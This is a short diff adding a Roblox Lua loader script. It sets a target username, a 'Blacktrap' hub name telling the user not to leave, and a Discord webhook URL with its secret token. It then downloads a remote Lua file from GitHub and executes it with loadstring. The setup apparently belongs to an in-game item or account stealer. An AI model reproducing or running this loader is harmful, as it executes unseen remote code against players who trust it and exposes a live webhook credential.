@@ -1,0 +1,4 @@
+_G.Username = "baolongfarming2"
+_G.HubName = "Blacktrap are loading, please don't leave"
+_G.WebhookUrl = "discord.com/api/webhooks/1107503794629115956/MaoRdrUcY9OCxPbvNaGmOBJPsBiMA3DeMCWu6--MVwRuZVNQFQm-G0TCe65Es5kEDUXc"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
